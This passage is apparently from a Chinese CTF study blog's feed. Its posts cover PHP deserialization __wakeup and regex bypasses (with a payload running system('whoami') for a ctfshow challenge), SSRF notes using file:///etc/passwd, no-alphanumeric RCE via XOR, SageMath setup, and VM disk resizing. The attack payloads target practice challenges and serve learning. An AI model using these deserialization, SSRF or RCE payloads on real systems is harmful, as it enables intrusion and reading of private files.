public）是指在进行对象反序列化时，访问修饰符的级别会被忽略或绕过。</p><p>在面向对象编程中，访问修饰符（如<code>public</code>、<code>protected</code>、<code>private</code>）用于控制类的成员（字段、方法）的可访问性。<code>protected</code>访问修饰符表示成员只能在当前类或其子类中访问，而<code>public</code>访问修饰符表示成员可以在任何地方访问。</p><p>当一个对象被序列化时，其状态被转换为字节流以便存储或传输。在对象反序列化过程中，字节流会被还原为对象的状态。但是，有时候反序列化操作可能会忽略对访问修饰符的检查，导致一些本应该是受保护的成员变成了公开的，即从<code>protected</code>变成了<code>public</code>。</p><p>这种行为可能会带来安全风险，因为本来受到访问限制的成员现在可以被任意访问和修改，可能会导致程序行为不一致或安全漏洞。因此，在进行对象反序列化时，需要特别注意对访问修饰符的敏感性，确保反序列化的对象状态不会违反设计的访问控制约束。</p></blockquote><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><pre><code class="php">__construct()  #每次创建新对象时先调用此方法，实例化的时候触发__destruct()  #某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:&#123;i:0;O:4:&quot;User&quot;:0:&#123;&#125;i:0;s:3:&quot;xxx&quot;;&#125;，被覆盖后没有变量指向User对象），实例化或者反序列化的时候会触发__toString()  #把类被当做一个字符串使用时调用__wakeup()  #使用unserialize函数，反序列化恢复对象之前时调用，反序列化之前调用wakeup__sleep()  #使用serialize()函数，序列化对象之前时调用，序列化的时候会检查是否存在，若存在会先调用再序列化__call()  #在对象中，调用不存在的方法或调用权限不足时调用（比如私有变量private）__callstatic()    #在静态上下文中，调用不可访问的方法时触发__get()  #访问不存在的成员变量时调用__set()   #设置不存在的成员变量时调用__invoke()  #当尝试以调用函数的方式调用一个对象时触发__autoload()  #尝试加载未定义的类__isset()   #在不可访问的属性上调用isset()或empty()触发__unset()   #在不可访问的属性上使用unset()时触发</code></pre><h3 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h3><h4 id="wakeup-失效"><a href="#wakeup-失效" class="headerlink" title="__wakeup()失效"></a>__wakeup()失效</h4><h5 id="适用版本：PHP5"><a href="#适用版本：PHP5" class="headerlink" title="适用版本：PHP5&lt;5.6.25 或 PHP7&lt;7.0.10"></a>适用版本：PHP5&lt;5.6.25 或 PHP7&lt;7.0.10</h5><p>当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。</p><p>实际序列化内容为：</p><pre><code class="php">O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><p>如：</p><pre><code class="php">O:4:&quot;Demo&quot;:2:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><h5 id="PHP7-3"><a href="#PHP7-3" class="headerlink" title="PHP7.3"></a>PHP7.3</h5><p><code>Serialize</code> 特性：<code>O</code> 改为 <code>C</code>（需要利用内置了<code>Serializable</code>接口的类）</p><p>若只需绕过wakeup这就ok了</p><p>例如</p><pre><code class="php">O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><p>改为</p><pre><code class="php">C:4:&quot;Demo&quot;:1:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><h5 id="需要用属性命令执行"><a href="#需要用属性命令执行" class="headerlink" title="需要用属性命令执行"></a>需要<strong>用属性命令执行</strong></h5><p><code>demo</code></p><pre><code class="php">&lt;?php$arr=array(&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2);$cc=new ArrayObject($arr);//在PHP中创建一个ArrayObject对象的语法echo serialize($cc);</code></pre><p><code>payload</code></p><pre><code class="php">O:11:&quot;ArrayObject&quot;:4:&#123;i:0;i:0;i:1;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;i:2;a:0:&#123;&#125;i:3;N;&#125;</code></pre><p>用下面绕过__wakeup()</p><pre><code class="php">C:11:&quot;ArrayObject&quot;:4:&#123;i:0;i:0;i:1;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;i:2;a:0:&#123;&#125;i:3;N;&#125;</code></pre><p>举个例子</p><h5 id="愚人杯3rd-easy-php"><a href="#愚人杯3rd-easy-php" class="headerlink" title="愚人杯3rd [easy_php]"></a>愚人杯3rd [easy_php]</h5><p><code>考点：PHP7.3 __wakeup绕过，ArrayObject内置类</code></p><p>从上面我们已知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要<strong>用属性命令执行</strong>就不行了</p><p>这种情况我们可以用内置类<strong>ArrayObject</strong></p><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    public function __wakeup()&#123;        die(&quot;not allowed!&quot;);    &#125;    public function __destruct()&#123;        system($this-&gt;ctfshow);    &#125;&#125;$data = $_GET[&#39;1+1&gt;2&#39;];if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;    unserialize($data);&#125;/*正则表达式 /^[Oa]:[\d]+/i 可以解读为：    ^：匹配字符串的开头    [Oa]：匹配字符 O 或 a    :：匹配冒号字符    [\d]+：匹配一个或多个数字字符    /i：表示不区分大小写*/?&gt;</code></pre><p>这个题目很明显就是要执行system方法，然后不可以以<code>O\a</code>打头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是这里都去掉了，所以回到上面说的那个ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p><pre><code class="php">&lt;?phpclass ctfshow &#123;    public $ctfshow;    public function __wakeup()&#123;        die(&quot;not allowed!&quot;);    &#125;    public function __destruct()&#123;        echo &quot;OK&quot;;        system($this-&gt;ctfshow);    &#125;    &#125;$a=new ctfshow;$a-&gt;ctfshow=&quot;whoami&quot;;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?&gt;//O:11:&quot;ArrayObject&quot;:4:&#123;i:0;i:0;i:1;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;i:2;a:0:&#123;&#125;i:3;N;&#125;</code></pre><p><code>payload</code></p><pre><code class="php">C:11:&quot;ArrayObject&quot;:4:&#123;i:0;i:0;i:1;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;i:2;a:0:&#123;&#125;i:3;N;&#125;</code></pre><h4 id="绕过preg-match-匹配的关键字"><a href="#绕过preg-match-匹配的关键字" class="headerlink" title="绕过preg_match() 匹配的关键字"></a>绕过preg_match() 匹配的关键字</h4><h5 id="PHP低版本"><a href="#PHP低版本" class="headerlink" title="PHP低版本"></a><strong>PHP低版本</strong></h5><p>可使用<code>+</code>，<code>&lt;</code>绕过正则，如：</p><pre><code class="php">O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><pre><code class="php">O:+4:&quot;Demo&quot;:1:&#123;s:8:&quot;Demofile&quot;;s:8:&quot;flag.php&quot;;&#125;O:&lt;4:&quot;Demo&quot;:1:&#123;s:8:&quot;Demofile&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h5 id="普通字符串"><a href="#普通字符串" class="headerlink" title="普通字符串"></a><strong>普通字符串</strong></h5><p>PHP序列化中存在序列化类型 <code>S</code>，相较于小写的 <code>s</code>，大写 <code>S</code> 是escaped字符串，会将 <code>\xx</code> 形式作为一个16进制字符处理，如：<code>D</code> 的十六进制是 <code>44</code>，所以把 <code>Demo</code>替换为 <code>\44emo</code> 即可绕过。</p><p><strong><code>/^O:\d+/</code></strong></p><pre><code class="php">O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;Demo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><pre><code class="php">O:4:&quot;Demo&quot;:1:&#123;S:4:&quot;\44emo&quot;;s:7:&quot;flag.php&quot;;&#125;</code></pre><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> 反序列化 </category>
          
          <category> 反序列化基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sagemath</title>
      <link href="/2023/07/22/sagemath/"/>
      <url>/2023/07/22/sagemath/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一下sagemath的安装"><a href="#记录一下sagemath的安装" class="headerlink" title="记录一下sagemath的安装"></a>记录一下sagemath的安装</h1><p><img src="/img/gaoshu.jpg"></p><p>本来是装的win版的，but需要用到pwntools,只能去搞个Ubuntu的（kali寄了）</p><h2 id="简单记录一下win版"><a href="#简单记录一下win版" class="headerlink" title="简单记录一下win版"></a>简单记录一下win版</h2><p>win版的坑比较少，下载完有三个软件</p><h3 id="win使用"><a href="#win使用" class="headerlink" title="win使用"></a>win使用</h3><p>依次运行sagemath、sagemath notebook、sagemath shell</p><p>notebook运行会起一个本地的服务，里面可以存放脚本文件</p><p><img src="/img/sagemath1.png"></p><p>在shell中可以执行命令</p><pre><code class="python">sage test.sage</code></pre><p>个别文件需要</p><pre><code class="python">sage -python test.sage</code></pre><p><a href="https://blog.csdn.net/u010883831/article/details/128288002">下载一些第三方库</a>同样在shell</p><pre><code class="python">sage --pip install XXX</code></pre><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><p><del>坑好多</del></p><p>原本是</p><pre><code class="sh">sudo pip install sagemath</code></pre><pre><code class="sh">sudo pip install sage</code></pre><p>but下载完之后sage是空的</p><p>创建一个存放的文件夹</p><pre><code class="sh">sudo mkdir sagemath</code></pre><pre><code class="sh">sudo chmod 777 sagemath</code></pre><p><a href="https://mirrors.mit.edu/sage/linux/64bit/index.html">下载</a>编译好的二进制文件,按自己的版本选</p><p><img src="/img/sagemath2.png"></p><p>下载完成后拖入Ubuntu中执行解压缩命令</p><pre><code class="sh">tar xvf sage-9.3-Ubuntu_18.04-x86_64.tar.bz2</code></pre><p>​        </p><p>进入解压好的文件执行</p><pre><code class="sh">./sage</code></pre><p>出现这个窗口说明运行成功</p><p><img src="/img/sagemath3.png"></p><p>为了方便我们构造一个软连接去全局使用命令</p><p>先拿到当前路径</p><pre><code class="sh">pwd</code></pre><pre><code class="sh">sudo /home/jue/桌面/sagemath/SageMath/sage /usr/loacl/bin/sage</code></pre><p><img src="/img/sagemath4.png"></p><p>可以看到已经可以全局执行sage命令</p><p>尝试一下之前的<a href="https://cg-jue.github.io/2023/07/16/00-01/">低加密指数广播攻击</a>的sage脚本</p><pre><code class="python">from Crypto.Util.number import *from pwn import *from tqdm import trangen = []c = []for i in trange(111):    io = remote(&#39;url&#39;, &#39;10000&#39;)    n.append(eval(io.recvline().decode()[3:]))    c.append(eval(io.recvline().decode()[3:]))    io.close()    sleep(0.1)e = 111ms = crt(c, n)R.&lt;x&gt; = PolynomialRing(ZZ)f = x^e - msm = f.roots()[0][0]print(long_to_bytes(m))</code></pre><pre><code class="python">sage test.sage</code></pre><p>会生成一个test.sage.py文件（不知道什么用）</p><p>这里报错没有Crypto库，原本python环境是有的</p><pre><code>No module named &#39;Crypto&#39;</code></pre><p>因为sage的环境和python的环境是分开的</p><p>给sage下载和给python下载有一点区别</p><p>我缺了三个库（下所须的）</p><pre><code class="python">sahe --pip install pycryptodome --index-url https://pypi.tuna.tsinghua.edu.cn/simplesage --pip install pwntools --index-url https://pypi.tuna.tsinghua.edu.cn/simplesage --pip install tqdm --index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></pre><p>下完所须库直接</p><pre><code class="python">sage test.sage</code></pre><p><img src="/img/sagemath5.png"></p><p>这里能运行就差不多了</p><p><img src="/img/lei.png"></p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AddSCSI</title>
      <link href="/2023/07/22/AddSCSI/"/>
      <url>/2023/07/22/AddSCSI/</url>
      
        <content type="html"><![CDATA[<p>最近打dasctf，发现需要用到sagemath，为了安装，来扩展一下Ubuntu的硬盘，简单记录一下</p><p>关机状态下扩展内存，but有快照的情况下不能扩展</p><p><img src="/img/addscsi1.png"></p><p>先打个快照，防止出问题</p><p>运行虚拟机用 sudo df -h看一下现有硬盘容量</p><p><img src="/img/addscsi2.png"></p><p>接下来执行命令</p><pre><code class="sh">sudo fdisk /dev/sda </code></pre><p>输入d删除分区</p><pre><code class="sh">d</code></pre><p>依次输入</p><pre><code class="sh">n、p、回车、回车、+100G#按自己的需求输入，但是不能超过你第一步划分的最大容量</code></pre><p>完成后继续输入p查看容量</p><p>确认无误后</p><p>输入a，再w命令保存</p><p>最后输入q退出命令行</p><p><img src="/img/addscsi3.png"></p><p>输入下面命令重启虚拟机</p><pre><code class="sh">sudo reboot</code></pre><p>待重启完成后，执行命令</p><pre><code class="sh">sudo resize2fs /dev/sda1</code></pre><p>完成后输入</p><pre><code class="sh">df -h</code></pre><p>查看硬盘已成功扩容了</p><p><a href="https://blog.csdn.net/qq_37140721/article/details/125619393">参考</a></p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF学习总结</title>
      <link href="/2023/07/18/SSRF/"/>
      <url>/2023/07/18/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF学习总结"><a href="#SSRF学习总结" class="headerlink" title="SSRF学习总结"></a>SSRF学习总结</h1><p>一些博客</p><p>ssrf0到1:<a href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html</a></p><p>SSRF安全指北：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&mid=2651203506&idx=1&sn=5e28499d3a6252c511a33fb186461202">https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=2651203506&amp;idx=1&amp;sn=5e28499d3a6252c511a33fb186461202</a></p><p>服务端请求伪造。产生的原因是由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。</p><p>通过用户输入的URL来获取图片。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击</p><p>攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。</p><p>SSRF攻击通常针对外部网络无法直接访问的内部系统</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h2><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/346220565">https://zhuanlan.zhihu.com/p/346220565</a></p><p><a href="https://zhuanlan.zhihu.com/p/590945804">https://zhuanlan.zhihu.com/p/590945804</a></p><p>能够对外发起网络请求的地方，就可能存在 SSRF</p><p>漏洞产生SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制，如PHP中的curl_exec、file_get_contents、fsockopen</p><blockquote><p>除了http&#x2F;https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p></blockquote><p>分三类</p><p><strong>显示对攻击者的响应</strong>（Basic）<br>它显示对攻击者的响应，因此在服务器获取攻击者要求的URL后，它将把响应发送回攻击者。返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码。</p><p><strong>不显示响应</strong>（Blind)：和上面正好相反，不会返回结果到客户端。当您从未从初势请求中获取有关目标服务的任何信息时，就会发生这种ssrf。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSbin等类似工具。这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的。这种ssrf通常易于验证，但难以利用。</p><p><strong>Semi-ssrf</strong>:与Blind相似，这种ssrf不会返回相关结果请求的所有详细信息，但是会暴露一些数据。这可能是部分数据或错误信息，他们为攻击者提供了更多信息。有时，关于请求的元数据（例如响应时间）也可以视为Semi-ssrf，因为它们允许攻击者验证请求是否成功。这种ssrf通常足以验证漏洞，但并不总是能够提取敏感数据。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a><strong>协议</strong></h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a><strong>gopher协议</strong></h4><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a><strong>file协议</strong></h4><p>file和dict<a href="https://www.cnblogs.com/zzjdbk/p/12970919.html">https://www.cnblogs.com/zzjdbk/p/12970919.html</a></p><p>file协议主要用于访问本地计算机中的文件，命令格式为：</p><p>file:&#x2F;&#x2F;文件路径</p><pre><code>file:///etc/passwdfile:///var/www/html/index.php</code></pre><p><strong>file协议与http协议区别</strong><br>（1）file协议主要用于读取服务器本地文件，访问的是本地的静态资源<br>（2）http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析<br>（3）http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以<br>（4）file对应的类似http的协议是ftp协议（文件传输协议）<br>（5）file不能跨域</p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><p><strong>首先尝试获取外网 URL</strong></p><p>例如<a href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a></p><p><strong>接下来尝试获取内网 URL</strong> </p><p>127.0.0.1</p><p>访问成功(如果没有过滤<strong>（例如ctfshow-web入门-web351）</strong>)既可以判断为SSRF</p><p><strong>FILE 协议获取本地信息</strong></p><p>可以尝试配合 file 协议来读取本地的文件信息(源码，flag等等)</p><pre><code>file:///etc/passwdfile:///var/www/html/index.php</code></pre><p>等</p><p>本机内网 IP 地址信息</p><p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</p><p><strong>探测内网端口</strong></p><p>SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP  回显的端口，具体可以探测哪些端口需要大家自己动手去测试一下，BP 下使用迭代器模式爆破，设置好要爆破的 IP 和  端口即可批量探测出端口开放的信息</p><h2 id="web-351"><a href="#web-351" class="headerlink" title="web-351"></a>web-351</h2><pre><code class="PHP">&lt;?php error_reporting(0); highlight_file(__FILE__); $url=$_POST[&#39;url&#39;]; $ch=curl_init($url); curl_setopt($ch, curlOPT_HEADER, 0); curl_setopt($ch, curlOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ?&gt;</code></pre><h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a><strong>一些函数</strong></h3><p><code>error_reporting(0);</code> 函数调用会抑制在代码执行期间可能发生的 PHP 错误消息。</p><p>就是不报错 0代表关，1代表开</p><p><code>curl_setopt()</code> 函数设置 curl 会话的各种选项。在这段代码中，设置了两个选项：</p><ul><li><code>curlOPT_HEADER</code> 设置为 <code>0</code>，这意味着响应头不应包含在输出中。</li><li><code>curlOPT_RETURNTRANSFER</code> 设置为 <code>1</code>，这意味着响应应作为字符串返回，而不是直接输出。</li></ul><p><code>curl_exec()</code> 函数执行 curl 请求，并将响应作为字符串返回。</p><p><code>$_POST[&#39;url&#39;]</code> 传入任意 URL，这可能允许攻击者代表服务器执行任意请求或执行恶意代码。</p><h3 id="针对漏洞的防护"><a href="#针对漏洞的防护" class="headerlink" title="针对漏洞的防护"></a><strong>针对漏洞的防护</strong></h3><p>建议在使用 curl 请求之前验证和清理用户输入。此外，建议使用 HTTPS 而不是 HTTP，以确保在服务器和客户端之间传输的数据是加密的和安全的。</p><h3 id="CURL请求"><a href="#CURL请求" class="headerlink" title="CURL请求"></a><strong>CURL请求</strong></h3><p>参考blog:<a href="https://blog.csdn.net/luolianxi/article/details/105465057">https://blog.csdn.net/luolianxi/article/details/105465057</a></p><p>全称Command Line URL Viewer，是一个Linux命令行工具，能从服务器下载数据，也能往服务器上发送数据，支持多种协议，支持的协议有：DICT，FILE，FTP，FTPS，GOPHER，HTTP，HTTPS，IMAP，IMAPS，LDAP，LDAPS，POP3，POP3S，RTMP，RTSP，SCP，SFTP，SMB，SMBS，SMTP，SMTPS，TELNET和TFTP。</p><h4 id="基本用法示例"><a href="#基本用法示例" class="headerlink" title="基本用法示例"></a>基本用法示例</h4><pre><code>curl url  //执行后url的html就会显示curl -o f1 ftp://user:pwd@myftp/Ricky/test.ini //curl dict://dict.org/d:test</code></pre><p><strong>默认curl使用GET方式请求数据</strong></p><p>这种方式下直接通过URL传递数据<br> 可以通过 –data&#x2F;-d 方式指定使用POST方式传递数据</p><pre><code>GET:curl -u username https://api.github.com/user?access_token=XXXXXXXXXXPOST:curl -u username --data &quot;param1=value1&amp;param2=value&quot; https://api.github.com</code></pre><p>除此之外也可以-X来指定访问方式</p><p>curl -I -X 指定 <a href="https://api.github.cim/">https://api.github.cim</a></p><p><strong>也可以指定一个文件，将该文件中的内容当作数据传递给服务器端</strong></p><p>curl –data @filename <a href="https://github.api.com/authorizations">https://github.api.com/authorizations</a></p><h4 id="CURL的命令参数"><a href="#CURL的命令参数" class="headerlink" title="CURL的命令参数"></a>CURL的命令参数</h4><pre><code class="php">-a/--append 上传文件时，附加到目标文件   -A/--user-agent &lt;string&gt;  设置用户代理发送给服务器   - anyauth   可以使用“任何”身份验证方法   -b/--cookie &lt;name=string/file&gt; cookie字符串或文件读取位置   - basic 使用HTTP基本验证   -B/--use-ascii 使用ASCII /文本传输   -c/--cookie-jar &lt;file&gt; 操作结束后把cookie写入到这个文件中   -C/--continue-at &lt;offset&gt;  断点续转   -d/--data &lt;data&gt;   HTTP POST方式传送数据   --data-ascii &lt;data&gt;  以ascii的方式post数据   --data-binary &lt;data&gt; 以二进制的方式post数据   --negotiate     使用HTTP身份验证   --digest        使用数字身份验证   --disable-eprt  禁止使用EPRT或LPRT   --disable-epsv  禁止使用EPSV   -D/--dump-header &lt;file&gt; 把header信息写入到该文件中   --egd-file &lt;file&gt; 为随机数据(SSL)设置EGD socket路径   --tcp-nodelay   使用TCP_NODELAY选项   -e/--referer 来源网址   -E/--cert &lt;cert[:passwd]&gt; 客户端证书文件和密码 (SSL)   --cert-type &lt;type&gt; 证书文件类型 (DER/PEM/ENG) (SSL)   --key &lt;key&gt;     私钥文件名 (SSL)   --key-type &lt;type&gt; 私钥文件类型 (DER/PEM/ENG) (SSL)   --pass  &lt;pass&gt;  私钥密码 (SSL)   --engine &lt;eng&gt;  加密引擎使用 (SSL). &quot;--engine list&quot; for list   --cacert &lt;file&gt; CA证书 (SSL)   --capath &lt;directory&gt; CA目录 (made using c_rehash) to verify peer against (SSL)   --ciphers &lt;list&gt;  SSL密码   --compressed    要求返回是压缩的形势 (using deflate or gzip)   --connect-timeout &lt;seconds&gt; 设置最大请求时间   --create-dirs   建立本地目录的目录层次结构   --crlf          上传是把LF转变成CRLF   -f/--fail          连接失败时不显示http错误   --ftp-create-dirs 如果远程目录不存在，创建远程目录   --ftp-method [multicwd/nocwd/singlecwd] 控制CWD的使用   --ftp-pasv      使用 PASV/EPSV 代替端口   --ftp-skip-pasv-ip 使用PASV的时候,忽略该IP地址   --ftp-ssl       尝试用 SSL/TLS 来进行ftp数据传输   --ftp-ssl-reqd  要求用 SSL/TLS 来进行ftp数据传输   -F/--form &lt;name=content&gt; 模拟http表单提交数据   -form-string &lt;name=string&gt; 模拟http表单提交数据   -g/--globoff 禁用网址序列和范围使用&#123;&#125;和[]   -G/--get 以get的方式来发送数据   -h/--help 帮助   -H/--header &lt;line&gt;自定义头信息传递给服务器   --ignore-content-length  忽略的HTTP头信息的长度   -i/--include 输出时包括protocol头信息   -I/--head  只显示文档信息   从文件中读取-j/--junk-session-cookies忽略会话Cookie   - 界面&lt;interface&gt;指定网络接口/地址使用   - krb4 &lt;级别&gt;启用与指定的安全级别krb4   -j/--junk-session-cookies 读取文件进忽略session cookie   --interface &lt;interface&gt; 使用指定网络接口/地址   --krb4 &lt;level&gt;  使用指定安全级别的krb4   -k/--insecure 允许不使用证书到SSL站点   -K/--config  指定的配置文件读取   -l/--list-only 列出ftp目录下的文件名称   --limit-rate &lt;rate&gt; 设置传输速度   --local-port&lt;NUM&gt; 强制使用本地端口号   -m/--max-time &lt;seconds&gt; 设置最大传输时间   --max-redirs &lt;num&gt; 设置最大读取的目录数   --max-filesize &lt;bytes&gt; 设置最大下载的文件总量   -M/--manual  显示全手动   -n/--netrc 从netrc文件中读取用户名和密码   --netrc-optional 使用 .netrc 或者 URL来覆盖-n   --ntlm          使用 HTTP NTLM 身份验证   -N/--no-buffer 禁用缓冲输出   -o/--output 把输出写到该文件中   -O/--remote-name 把输出写到该文件中，保留远程文件的文件名   -p/--proxytunnel   使用HTTP代理   --proxy-anyauth 选择任一代理身份验证方法   --proxy-basic   在代理上使用基本身份验证   --proxy-digest  在代理上使用数字身份验证   --proxy-ntlm    在代理上使用ntlm身份验证   -P/--ftp-port &lt;address&gt; 使用端口地址，而不是使用PASV   -Q/--quote &lt;cmd&gt;文件传输前，发送命令到服务器   -r/--range &lt;range&gt;检索来自HTTP/1.1或FTP服务器字节范围   --range-file 读取（SSL）的随机文件   -R/--remote-time   在本地生成文件时，保留远程文件时间   --retry &lt;num&gt;   传输出现问题时，重试的次数   --retry-delay &lt;seconds&gt;  传输出现问题时，设置重试间隔时间   --retry-max-time &lt;seconds&gt; 传输出现问题时，设置最大重试时间   -s/--silent静音模式。不输出任何东西   -S/--show-error   显示错误   --socks4 &lt;host[:port]&gt; 用socks4代理给定主机和端口   --socks5 &lt;host[:port]&gt; 用socks5代理给定主机和端口   --stderr &lt;file&gt;   -t/--telnet-option &lt;OPT=val&gt; Telnet选项设置   --trace &lt;file&gt;  对指定文件进行debug   --trace-ascii &lt;file&gt; Like --跟踪但没有hex输出   --trace-time    跟踪/详细输出时，添加时间戳   -T/--upload-file &lt;file&gt; 上传文件   --url &lt;URL&gt;     Spet URL to work with   -u/--user &lt;user[:password]&gt;设置服务器的用户和密码   -U/--proxy-user &lt;user[:password]&gt;设置代理用户名和密码   -v/--verbose   -V/--version 显示版本信息   -w/--write-out [format]什么输出完成后   -x/--proxy &lt;host[:port]&gt;在给定的端口上使用HTTP代理   -X/--request &lt;command&gt;指定什么命令   -y/--speed-time 放弃限速所要的时间。默认为30   -Y/--speed-limit 停止传输速度的限制，速度时间&#39;秒   -z/--time-cond  传送时间设置   -0/--http1.0  使用HTTP 1.0   -1/--tlsv1  使用TLSv1（SSL）   -2/--sslv2 使用SSLv2的（SSL）   -3/--sslv3         使用的SSLv3（SSL）   --3p-quote      like -Q for the source URL for 3rd party transfer   --3p-url        使用url，进行第三方传送   --3p-user       使用用户名和密码，进行第三方传送   -4/--ipv4   使用IP4   -6/--ipv6   使用IP6   -#/--progress-bar 用进度条显示当前的传送状态</code></pre><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre><code class="php">file:///etc/passwd</code></pre><pre><code class="php">file:///var/www/html/index.php</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无数字字母rce</title>
      <link href="/2023/07/18/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"/>
      <url>/2023/07/18/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><strong>原理</strong></p><p>Linux终端可以通过<code>$&#39;\xxx&#39;</code>的方式执行命令，xxx是字符ascii码的八进制形式，通过这一点，我们可以通过位运算符号和Linux终端的其他特性，在没有数字的情况下继续构造这样的形式以实现无字母数字仅用几个字符就实现任意命令执行。</p><p><strong>无数字字母rce绕过，基本上是对这个的绕过</strong></p><pre><code class="php">&lt;?phpif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) &#123;  eval($_GET[&#39;shell&#39;]);&#125;</code></pre><p><strong>先了解一些基础知识</strong></p><h2 id="PHP中的异或"><a href="#PHP中的异或" class="headerlink" title="PHP中的异或"></a>PHP中的异或</h2><pre><code>&lt;?phpecho &quot;5&quot;^&quot;Z&quot;;?&gt;</code></pre><p>输出为o</p><p>先把5和Z的ASCLL转换成二进制然后异或</p><p>即00110101和01011010异或得到十进制的111,为o.</p><p>函数执行</p><pre><code>&lt;?php    function o()&#123;        echo &quot;Hello,C6&quot;;    &#125;    $_++;    $__= &quot;5&quot; ^ &quot;Z&quot;;    $__();?&gt;</code></pre><p>结果能够输出”Hello,C6”，原理如下</p><blockquote><p>$__&#x3D; “5” ^ “Z”这步我们上面已经见过了,将会赋给__这个变量一个值”o”</p><p>由于PHP的动态语言特性,PHP允许我们将字符串当成函数来处理,因此在这里面的$__()就相当于调用了o()</p></blockquote><h2 id="PHP中的取反"><a href="#PHP中的取反" 